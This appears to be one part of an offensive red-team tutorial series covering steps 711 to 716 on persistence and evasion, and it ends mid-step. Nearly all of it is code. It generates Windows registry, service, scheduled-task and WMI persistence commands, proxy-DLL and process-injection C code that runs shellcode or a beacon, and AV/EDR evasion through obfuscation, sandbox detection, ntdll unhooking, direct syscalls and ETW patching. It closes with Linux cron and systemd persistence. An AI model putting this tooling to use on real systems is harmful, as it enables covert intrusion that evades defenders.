# Part 72: Advanced Red Team - Persistence & Evasion (Steps 711-720)

## Step 711: Windows Registry Persistence

```python
#!/usr/bin/env python3
# Windows Registry persistence techniques

import subprocess
import os
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class RegistryPersistence:
    """Windows Registry persistence mechanisms"""
    target_host: str
    username: str
    password: str
    
    # Registry run keys for persistence
    RUN_KEYS = [
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
    ]
    
    # Additional persistence keys
    ADVANCED_KEYS = [
        r"HKLM\SYSTEM\CurrentControlSet\Services",
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
        r"HKCU\Environment\UserInitMprLogonScript",
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
    ]
    
    def add_run_key_persistence(self, key_name: str, payload_path: str, hive: str = "HKCU") -> Dict:
        """Add payload to registry Run key"""
        reg_path = f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        # Using reg.exe
        cmd_direct = f'reg add "{reg_path}" /v "{key_name}" /t REG_SZ /d "{payload_path}" /f'
        
        # Using PowerShell
        cmd_ps = f'''powershell -c "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{key_name}' -Value '{payload_path}'"'''
        
        # Using impacket reg.py remotely
        cmd_remote = f'python3 reg.py {self.username}:{self.password}@{self.target_host} add -keyName "{reg_path}" -v "{key_name}" -vt REG_SZ -vd "{payload_path}"'
        
        return {
            "technique": "Registry Run Key",
            "key": f"{reg_path}\\{key_name}",
            "value": payload_path,
            "commands": {
                "local": cmd_direct,
                "powershell": cmd_ps,
                "remote": cmd_remote
            }
        }
    
    def winlogon_persistence(self, payload_path: str) -> Dict:
        """Modify Winlogon for persistence"""
        # Winlogon Userinit modification
        cmd_userinit = f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,{payload_path}" /f'
        
        # Winlogon Shell modification
        cmd_shell = f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,{payload_path}" /f'
        
        return {
            "technique": "Winlogon Persistence",
            "commands": {
                "userinit": cmd_userinit,
                "shell": cmd_shell
            }
        }
    
    def image_file_execution_options(self, target_exe: str, debugger_path: str) -> Dict:
        """IFEO debugger hijacking for persistence"""
        reg_path = f'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_exe}'
        cmd = f'reg add "{reg_path}" /v Debugger /t REG_SZ /d "{debugger_path}" /f'
        
        return {
            "technique": "IFEO Debugger Hijacking",
            "target": target_exe,
            "debugger": debugger_path,
            "command": cmd,
            "note": "Triggers when target exe is launched"
        }
    
    def screensaver_persistence(self, payload_path: str) -> Dict:
        """Screensaver persistence"""
        cmds = [
            f'reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{payload_path}" /f',
            f'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f',
            f'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f',
            f'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f'
        ]
        return {"technique": "Screensaver Persistence", "commands": cmds}
    
    def com_object_hijacking(self, clsid: str, payload_dll: str) -> Dict:
        """COM object hijacking for persistence"""
        # User-writable HKCU COM key
        reg_path = f'HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32'
        cmd = f'reg add "{reg_path}" /ve /t REG_SZ /d "{payload_dll}" /f'
        
        return {
            "technique": "COM Object Hijacking",
            "clsid": clsid,
            "payload": payload_dll,
            "command": cmd,
            "note": "COM object loaded by applications"
        }


@dataclass
class ServicePersistence:
    """Windows Service-based persistence"""
    
    def create_malicious_service(self, service_name: str, payload_path: str, display_name: str = None) -> Dict:
        """Create malicious Windows service"""
        display = display_name or service_name
        cmds = {
            "sc_create": f'sc create {service_name} binPath= "{payload_path}" start= auto DisplayName= "{display}"',
            "sc_start": f'sc start {service_name}',
            "reg_create": f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}" /v Start /t REG_DWORD /d 2 /f',
            "ps_create": f'New-Service -Name "{service_name}" -BinaryPathName "{payload_path}" -StartupType Automatic'
        }
        return {"technique": "Malicious Service", "service": service_name, "commands": cmds}
    
    def service_dll_hijacking(self, service_name: str, dll_path: str) -> Dict:
        """Service DLL hijacking"""
        cmd = f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "{dll_path}" /f'
        return {
            "technique": "Service DLL Hijacking",
            "service": service_name,
            "dll": dll_path,
            "command": cmd
        }


if __name__ == '__main__':
    reg_persist = RegistryPersistence("192.168.1.100", "admin", "password")
    
    # Add run key
    result = reg_persist.add_run_key_persistence("WindowsUpdate", "C:\\Windows\\Temp\\update.exe")
    print(f"[+] Run Key: {result['key']}")
    
    # Winlogon
    result = reg_persist.winlogon_persistence("C:\\Windows\\Temp\\payload.exe")
    print(f"[+] Winlogon Userinit: {result['commands']['userinit'][:60]}...")
    
    # IFEO
    result = reg_persist.image_file_execution_options("notepad.exe", "C:\\Windows\\Temp\\payload.exe")
    print(f"[+] IFEO Hijack: {result['command'][:60]}...")
```

## Step 712: Scheduled Tasks & WMI Persistence

```python
#!/usr/bin/env python3
# Scheduled tasks and WMI event subscription persistence

import subprocess
from dataclasses import dataclass
from typing import Dict, List

@dataclass
class ScheduledTaskPersistence:
    """Windows Scheduled Task persistence"""
    
    def create_task_schtasks(self, task_name: str, payload_path: str, trigger: str = "ONLOGON") -> Dict:
        """Create scheduled task using schtasks.exe"""
        # Basic task creation
        cmd_basic = (
            f'schtasks /create /tn "{task_name}" '
            f'/tr "{payload_path}" '
            f'/sc {trigger} '
            f'/ru SYSTEM '
            f'/f'
        )
        
        # Hidden task with random schedule
        cmd_hidden = (
            f'schtasks /create /tn "\\Microsoft\\Windows\\{task_name}" '
            f'/tr "{payload_path}" '
            f'/sc MINUTE /mo 15 '
            f'/ru SYSTEM '
            f'/f'
        )
        
        # PowerShell task creation (harder to detect)
        cmd_ps = f'''powershell -c "
$Action = New-ScheduledTaskAction -Execute '{payload_path}'
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName '{task_name}' -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force
"'''
        
        return {
            "technique": "Scheduled Task",
            "task": task_name,
            "trigger": trigger,
            "commands": {
                "basic": cmd_basic,
                "hidden": cmd_hidden,
                "powershell": cmd_ps
            }
        }
    
    def task_xml_bypass(self, task_name: str, payload_path: str) -> str:
        """Create task via XML for more control"""
        xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>{payload_path}</Command>
    </Exec>
  </Actions>
</Task>'''
        return xml


@dataclass  
class WMIPersistence:
    """WMI Event Subscription persistence"""
    
    def create_wmi_subscription(self, name: str, payload_path: str, trigger_interval: int = 60) -> Dict:
        """Create WMI event subscription for persistence"""
        # PowerShell WMI subscription
        ps_script = f'''# WMI Permanent Event Subscription
$filterName = "{name}Filter"
$consumerName = "{name}Consumer"
$query = "SELECT * FROM __InstanceModificationEvent WITHIN {trigger_interval} WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# Create Event Filter
$filterArgs = @{{
    Name = $filterName
    EventNamespace = 'root/cimv2'
    QueryLanguage = 'WQL'
    Query = $query
}}
$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $filterArgs

# Create Command Line Consumer
$consumerArgs = @{{
    Name = $consumerName
    CommandLineTemplate = "{payload_path}"
}}
$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs

# Bind Filter to Consumer
$bindingArgs = @{{
    Filter = [Ref] $filter
    Consumer = [Ref] $consumer
}}
$binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs

Write-Host "WMI subscription created: $filterName -> $consumerName"'''
        
        # MOF-based WMI subscription
        mof_content = f'''#pragma namespace("\\\\\\\\.\\\\ root\\\\subscription")

instance of __EventFilter as $EventFilter
{{
    Name = "{name}Filter";
    EventNamespace = "Root\\\\Cimv2";
    Query = "Select * From __InstanceModificationEvent Within {trigger_interval} Where TargetInstance Isa \\"Win32_PerfFormattedData_PerfOS_System\\"";
    QueryLanguage = "WQL";
}};

instance of CommandLineEventConsumer as $Consumer
{{
    Name = "{name}Consumer";
    CommandLineTemplate = "{payload_path}";
}};

instance of __FilterToConsumerBinding
{{
    Filter = $EventFilter;
    Consumer = $Consumer;
}};'''
        
        return {
            "technique": "WMI Event Subscription",
            "name": name,
            "trigger_interval": trigger_interval,
            "ps_script": ps_script,
            "mof_content": mof_content,
            "cleanup": [
                f'Get-CimInstance -Namespace root/subscription -ClassName __EventFilter | Where-Object {{$_.Name -eq "{name}Filter"}} | Remove-CimInstance',
                f'Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer | Where-Object {{$_.Name -eq "{name}Consumer"}} | Remove-CimInstance',
                f'Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding | Remove-CimInstance'
            ]
        }


if __name__ == '__main__':
    task_persist = ScheduledTaskPersistence()
    result = task_persist.create_task_schtasks("MicrosoftUpdate", "C:\\Windows\\Temp\\beacon.exe")
    print(f"[+] Task created: {result['task']}")
    print(f"[+] Hidden path: {result['commands']['hidden'][:60]}...")
    
    wmi_persist = WMIPersistence()
    result = wmi_persist.create_wmi_subscription("SysHelper", "C:\\Windows\\Temp\\beacon.exe", 120)
    print(f"[+] WMI subscription: {result['name']} (every {result['trigger_interval']}s)")
```

## Step 713: DLL Hijacking & Search Order Hijacking

```python
#!/usr/bin/env python3
# DLL hijacking and search order hijacking techniques

import os
import subprocess
from dataclasses import dataclass, field
from typing import List, Dict, Tuple

@dataclass
class DLLHijacking:
    """DLL hijacking techniques"""
    
    # Common vulnerable DLL hijacking targets
    VULNERABLE_APPS = {
        "putty": {"dll": "UxTheme.dll", "path": "C:\\Program Files\\PuTTY\\"},
        "winscp": {"dll": "winscp.dll", "path": "C:\\Program Files\\WinSCP\\"},
        "notepad++": {"dll": "UxTheme.dll", "path": "C:\\Program Files\\Notepad++\\"},
        "vlc": {"dll": "plugins\\codec\\libmp4_plugin.dll", "path": "C:\\Program Files\\VideoLAN\\VLC\\"},
    }
    
    # Windows standard DLL search order
    SEARCH_ORDER = [
        "1. Application directory",
        "2. System32 (C:\\Windows\\System32)",
        "3. System (C:\\Windows\\System)",
        "4. Windows directory (C:\\Windows)",
        "5. Current working directory",
        "6. PATH directories",
    ]
    
    def generate_proxy_dll(self, target_dll: str, export_functions: List[str]) -> str:
        """Generate proxy DLL C code for DLL hijacking"""
        exports = "\n".join([f'#pragma comment(linker, "/export:{func}={target_dll[:-4]}_orig.{func}")'  
                             for func in export_functions])
        
        dll_code = f'''// Proxy DLL for {target_dll}
// Forwards exports to original DLL
#include <windows.h>
#include <stdio.h>

{exports}

// Payload execution
void ExecutePayload() {{
    // Add your shellcode or payload here
    STARTUPINFO si = {{ sizeof(si) }};
    PROCESS_INFORMATION pi;
    CreateProcess(
        NULL,
        "C:\\\\Windows\\\\Temp\\\\beacon.exe",
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );
}}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {{
    switch (dwReason) {{
        case DLL_PROCESS_ATTACH:
            ExecutePayload();
            break;
    }}
    return TRUE;
}}
'''
        return dll_code
    
    def find_hijackable_paths(self) -> List[Dict]:
        """Find potential DLL hijacking opportunities"""
        # Using Process Monitor filter: Result is NAME NOT FOUND, Path ends with .dll
        procmon_filter = {
            "filter": "Operation is CreateFile AND Result is NAME NOT FOUND AND Path ends with .dll",
            "tool": "Process Monitor (Sysinternals)",
            "command": "procmon.exe /BackingFile C:\\capture.pml /Runtime 30 /Quiet"
        }
        
        # Using PowerSploit Find-PathDLLHijack
        ps_find = [
            "Import-Module PowerSploit",
            "Find-PathDLLHijack",
            "Find-ProcessDLLHijack"
        ]
        
        return [
            {"method": "Process Monitor", "details": procmon_filter},
            {"method": "PowerSploit", "commands": ps_find},
        ]
    
    def phantom_dll_hijacking(self) -> Dict:
        """DLLs that Windows loads but don't exist"""
        # Known phantom DLLs - loaded by Windows but not always present
        phantom_dlls = [
            {"dll": "wlbsctrl.dll", "loads_from": "C:\\Windows\\System32", "trigger": "IKEEXT service start"},
            {"dll": "TSMSISrv.dll", "loads_from": "C:\\Windows\\System32", "trigger": "SessionEnv service"},
            {"dll": "wbemcomn.dll", "loads_from": "C:\\Windows\\System32", "trigger": "WMI operations"},
        ]
        return {"technique": "Phantom DLL Hijacking", "targets": phantom_dlls}


@dataclass
class SearchOrderHijacking:
    """DLL search order hijacking"""
    
    def identify_writable_paths(self) -> str:
        """Find writable directories in PATH"""
        ps_cmd = '''$env:PATH.Split(';') | ForEach-Object {
    $path = $_
    try {
        $acl = Get-Acl $path -ErrorAction Stop
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | Where-Object {
            $_.IdentityReference -match $currentUser.Split("\\\\")[1] -and
            $_.FileSystemRights -match "Write|FullControl"
        } | ForEach-Object {
            Write-Host "WRITABLE: $path" -ForegroundColor Green
        }
    } catch {}
}'''
        return ps_cmd
    
    def side_loading_attack(self, legit_exe: str, dll_name: str, payload_code: str) -> Dict:
        """DLL side-loading with legitimate signed executable"""
        return {
            "technique": "DLL Side-Loading",
            "exe": legit_exe,
            "dll": dll_name,
            "steps": [
                f"1. Place {legit_exe} in writable directory",
                f"2. Place malicious {dll_name} in same directory",
                f"3. Execute {legit_exe} - loads malicious DLL",
                "4. Legitimate signed binary loads your payload"
            ],
            "example": "teams.exe loading a fake dbghelp.dll"
        }


if __name__ == '__main__':
    dll_hijack = DLLHijacking()
    proxy_dll = dll_hijack.generate_proxy_dll("UxTheme.dll", ["OpenThemeData", "CloseThemeData", "DrawThemeBackground"])
    print(f"[+] Generated proxy DLL ({len(proxy_dll)} chars)")
    
    phantom = dll_hijack.phantom_dll_hijacking()
    for t in phantom["targets"]:
        print(f"[+] Phantom DLL: {t['dll']} - Trigger: {t['trigger']}")
```

## Step 714: Process Injection Techniques

```python
#!/usr/bin/env python3
# Advanced process injection techniques

import ctypes
import struct
import subprocess
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class ProcessInjection:
    """Windows process injection techniques"""
    
    # Process injection methods
    INJECTION_TECHNIQUES = [
        "Classic DLL Injection",
        "Process Hollowing",
        "APC Injection",
        "Thread Hijacking",
        "Reflective DLL Injection",
        "Module Stomping",
        "Process Doppelganging",
        "Transacted Hollowing",
        "Early Bird APC",
        "Heaven's Gate (WoW64)",
    ]
    
    def classic_shellcode_injection(self, target_pid: int, shellcode: bytes) -> str:
        """Classic shellcode injection using CreateRemoteThread"""
        c_code = f'''// Classic shellcode injection
#include <windows.h>
#include <stdio.h>

int main() {{
    DWORD pid = {target_pid};
    unsigned char shellcode[] = {{\n        // Shellcode bytes here\n    }};
    SIZE_T shellcodeLen = sizeof(shellcode);
    
    // Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, pid
    );
    if (!hProcess) {{ printf("OpenProcess failed\\n"); return 1; }}
    
    // Allocate memory in target
    LPVOID pRemoteCode = VirtualAllocEx(
        hProcess, NULL, shellcodeLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    
    // Write shellcode
    WriteProcessMemory(hProcess, pRemoteCode, shellcode, shellcodeLen, NULL);
    
    // Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemoteCode,
        NULL, 0, NULL
    );
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}}
'''
        return c_code
    
    def process_hollowing(self, target_exe: str, payload_path: str) -> str:
        """Process hollowing - replace legitimate process memory"""
        c_code = f'''// Process Hollowing
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

int main() {{
    STARTUPINFOA si = {{0}};
    PROCESS_INFORMATION pi = {{0}};
    si.cb = sizeof(si);
    
    // Create target process in suspended state
    if (!CreateProcessA("{target_exe}", NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {{
        return 1;
    }}
    
    // Get thread context to find base address
    CONTEXT ctx = {{0}};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Read base address from PEB (RCX on x64 = RBX on x86)
    LPVOID imageBase;
    ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(LPVOID), NULL);
    
    // Unmap the original executable
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto pNtUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    pNtUnmapViewOfSection(pi.hProcess, imageBase);
    
    // Load payload PE and map it
    // ... (PE parsing and mapping code)
    
    // Resume thread
    ResumeThread(pi.hThread);
    return 0;
}}
'''
        return c_code
    
    def apc_injection(self) -> str:
        """APC (Asynchronous Procedure Call) injection"""
        c_code = '''// Early Bird APC Injection
#include <windows.h>

int main() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create process suspended
    CreateProcessA("C:\\\\Windows\\\\System32\\\\notepad.exe",
        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    unsigned char shellcode[] = { /* shellcode */ 0x90 };
    
    // Allocate and write shellcode
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, shellcode, sizeof(shellcode), NULL);
    
    // Queue APC to main thread (executes before thread runs)
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);
    
    // Resume - APC executes before main thread code
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
'''
        return c_code
    
    def thread_hijacking(self, target_pid: int) -> str:
        """Hijack existing thread via SetThreadContext"""
        c_code = f'''// Thread Hijacking
#include <windows.h>
#include <tlhelp32.h>

DWORD FindThreadByPID(DWORD pid) {{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = {{sizeof(te)}};
    if (Thread32First(snapshot, &te)) {{
        do {{ if (te.th32OwnerProcessID == pid) {{ CloseHandle(snapshot); return te.th32ThreadID; }} }}
        while (Thread32Next(snapshot, &te));
    }}
    CloseHandle(snapshot); return 0;
}}

int main() {{
    DWORD pid = {target_pid};
    DWORD tid = FindThreadByPID(pid);
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
    
    // Suspend the thread
    SuspendThread(hThread);
    
    // Get thread context
    CONTEXT ctx = {{}};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
    
    // Allocate and write shellcode
    unsigned char shellcode[] = {{0x90}};
    LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, mem, shellcode, sizeof(shellcode), NULL);
    
    // Redirect RIP to shellcode
    ctx.Rip = (DWORD64)mem;
    SetThreadContext(hThread, &ctx);
    
    // Resume thread
    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}}
'''
        return c_code


if __name__ == '__main__':
    inject = ProcessInjection()
    print(f"[+] Available injection techniques: {len(inject.INJECTION_TECHNIQUES)}")
    for i, tech in enumerate(inject.INJECTION_TECHNIQUES, 1):
        print(f"    {i}. {tech}")
    
    code = inject.classic_shellcode_injection(1234, b"\x90" * 100)
    print(f"\n[+] Classic injection code generated ({len(code)} chars)")
    
    apc_code = inject.apc_injection()
    print(f"[+] APC injection code generated ({len(apc_code)} chars)")
```

## Step 715: Antivirus & EDR Evasion

```python
#!/usr/bin/env python3
# AV/EDR evasion techniques

import os
import struct
import base64
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class AVEvasion:
    """Antivirus evasion techniques"""
    
    def string_obfuscation(self, strings: List[str]) -> Dict:
        """Obfuscate suspicious strings in payload"""
        obfuscated = {}
        for s in strings:
            # XOR obfuscation
            key = 0x41
            xored = bytes([b ^ key for b in s.encode()])
            obfuscated[s] = {
                "xor_key": key,
                "encoded": xored.hex(),
                "decoder": f'bytes([b ^ 0x{key:02x} for b in bytes.fromhex("{xored.hex()}")]).decode()'
            }
        return obfuscated
    
    def import_obfuscation(self) -> str:
        """Obfuscate Windows API imports"""
        c_code = '''// Dynamic API Resolution - Avoid static imports
#include <windows.h>

// XOR decode function
char* xor_decode(char* encoded, int len, char key) {
    for (int i = 0; i < len; i++) encoded[i] ^= key;
    return encoded;
}

// Dynamically resolve API by hash
typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

int main() {
    // Resolve ntdll at runtime
    char dll_name[] = {0x6e^0x1, 0x74^0x1, 0x64^0x1, 0x6c^0x1, 0x6c^0x1, 0x00};
    xor_decode(dll_name, 5, 0x1);  // "ntdll"
    
    HMODULE hNtdll = LoadLibraryA(dll_name);
    
    // Resolve by walking export table (not GetProcAddress)
    // ... export table walking code
    
    return 0;
}
'''
        return c_code
    
    def sleep_obfuscation(self) -> str:
        """Evade sandbox analysis with sleep evasion"""
        techniques = {
            "standard_sleep": "Sleep(30000);  // May be patched by sandbox",
            "timer_sleep": '''// Use high-resolution timer to detect accelerated time
LARGE_INTEGER freq, start, end;
QueryPerformanceFrequency(&freq);
QueryPerformanceCounter(&start);
Sleep(10000);
QueryPerformanceCounter(&end);
double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
if (elapsed < 9.0) { ExitProcess(0); }  // Sandbox accelerated time
''',
            "network_check": '''// Check for real internet connectivity
HINTERNET hNet = InternetOpen("Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
HINTERNET hConn = InternetOpenUrl(hNet, "http://www.google.com", NULL, 0, 0, 0);
if (!hConn) { ExitProcess(0); }  // No internet = sandbox
''',
            "user_interaction": '''// Check for user interaction (cursor movement)
POINT pt1, pt2;
GetCursorPos(&pt1);
Sleep(10000);
GetCursorPos(&pt2);
if (pt1.x == pt2.x && pt1.y == pt2.y) { ExitProcess(0); }  // No mouse movement = sandbox
'''
        }
        return techniques
    
    def unhook_ntdll(self) -> str:
        """Unhook EDR hooks from ntdll.dll"""
        c_code = '''// Unhook NTDLL by loading fresh copy from disk
#include <windows.h>
#include <winternl.h>

BOOL UnhookNtdll() {
    // Get handle to hooked ntdll
    HANDLE hProcess = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(hProcess, hNtdll, &mi, sizeof(mi));
    
    // Open fresh ntdll from disk
    HANDLE hFile = CreateFileA(
        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL
    );
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // Get .text section of both DLLs
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHdr);
    
    for (int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++) {
        if (!strcmp((char*)pSection[i].Name, ".text")) {
            DWORD oldProt;
            VirtualProtect(
                (BYTE*)hNtdll + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE, &oldProt
            );
            // Overwrite hooked .text with clean copy
            memcpy(
                (BYTE*)hNtdll + pSection[i].VirtualAddress,
                (BYTE*)pMapping + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize
            );
            VirtualProtect(
                (BYTE*)hNtdll + pSection[i].VirtualAddress,
                pSection[i].Misc.VirtualSize,
                oldProt, &oldProt
            );
            break;
        }
    }
    
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}
'''
        return c_code


@dataclass
class EDREvasion:
    """EDR-specific evasion techniques"""
    
    def direct_syscalls(self) -> str:
        """Use direct syscalls to bypass EDR userland hooks"""
        asm_code = '''; Direct syscall - bypass userland hooks
; NtAllocateVirtualMemory syscall stub
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h  ; Syscall number (varies by Windows version)
    syscall
    ret
NtAllocateVirtualMemory ENDP

; NtWriteVirtualMemory syscall stub  
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3Ah  ; Syscall number
    syscall
    ret
NtWriteVirtualMemory ENDP
'''
        
        # SysWhispers2/SysWhispers3 approach
        syswhispers_note = {
            "tool": "SysWhispers2/SysWhispers3",
            "usage": "python SysWhispers2.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory -o syscalls",
            "benefit": "Dynamically resolves syscall numbers at runtime"
        }
        return {"asm": asm_code, "syswhispers": syswhispers_note}
    
    def kernel_callbacks_bypass(self) -> Dict:
        """Techniques to bypass kernel callbacks"""
        return {
            "PsSetCreateProcessNotifyRoutine_bypass": [
                "Process creation spoofing via PPID spoofing",
                "Use NtCreateUserProcess directly",
                "Fork and exec (CreateProcessInternalW)"
            ],
            "ObRegisterCallbacks_bypass": [
                "Handle table manipulation",
                "Direct kernel object access"
            ],
            "ETW_patching": [
                "Patch EtwEventWrite to return 0",
                "Use ETW bypass in ntdll",
                "Disable ETW providers via registry"
            ]
        }


if __name__ == '__main__':
    av_evasion = AVEvasion()
    
    # String obfuscation
    strings = ["VirtualAlloc", "CreateRemoteThread", "WriteProcessMemory"]
    obf = av_evasion.string_obfuscation(strings)
    print("[+] Obfuscated suspicious strings:")
    for orig, data in obf.items():
        print(f"    {orig} -> {data['encoded'][:20]}...")
    
    # Sleep obfuscation
    sleep_techs = av_evasion.sleep_obfuscation()
    print(f"[+] Sleep evasion techniques: {list(sleep_techs.keys())}")
```

## Step 716: Linux Persistence Techniques

```python
#!/usr/bin/env python3
# Linux persistence mechanisms

import os
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class LinuxPersistence:
    """Linux persistence mechanisms"""
    target_user: str = "www-data"
    payload_path: str = "/tmp/.hidden_payload"
    
    PERSISTENCE_METHODS = [
        "Cron jobs", "Systemd services", "SSH authorized keys",
        "Bashrc/profile", "LD_PRELOAD", "PAM modules",
        "SUID binaries", "Kernel modules", "Alias poisoning",
        "Git hooks", "Docker entrypoint", "At jobs"
    ]
    
    def cron_persistence(self) -> Dict:
        """Cron-based persistence"""
        methods = {
            "user_cron": f'(crontab -l 2>/dev/null; echo "*/5 * * * * {self.payload_path}") | crontab -',
            "system_cron": f'echo "*/5 * * * * root {self.payload_path}" >> /etc/cron.d/sysupdate',
            "crontab_file": f'echo "@reboot {self.payload_path}" > /var/spool/cron/crontabs/{self.target_user}',
            "cron_d": f'echo "* * * * * root {self.payload_path} > /dev/null 2>&1" > /etc/cron.d/.update',
            "anacron": f'echo "{self.payload_path}" > /etc/cron.daily/.syscheck',
        }
        return {"technique": "Cron Persistence", "methods": methods}
    
    def systemd_persistence(self) -> Dict:
        """Systemd service persistence"""
        service_content = f'''[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart={self.payload_path}
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
'''
        
        timer_content = '''[Unit]
Description=System Health Check Timer

[Timer]
OnBootSec=5min
OnUnitActiveSec=15min
Unit=syshealth.service

[Install]
WantedBy=timers.target
'''
